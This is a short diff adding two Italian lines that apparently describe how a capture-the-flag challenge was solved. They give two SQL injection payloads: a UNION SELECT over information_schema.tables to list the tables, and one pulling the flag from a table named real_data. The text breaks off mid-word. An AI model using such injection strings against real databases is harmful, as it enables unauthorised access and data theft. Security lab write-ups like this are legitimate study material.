@@ -1,0 +1,2 @@
+ho usato questa query: 1' or 'a' = 'a' UNION SELECT table_name,'c','i','a','o','5' FROM information_schema.tables WHERE 'a' ='a per riuscire a capire quali tabelle esistessero nello schema.
+Inifine ho usato questa query: 1' or 'a' = 'a' UNION SELECT *,1,2,3,4 FROM real_data WHERE 'a' ='a  per recuperare la flag da real_dat
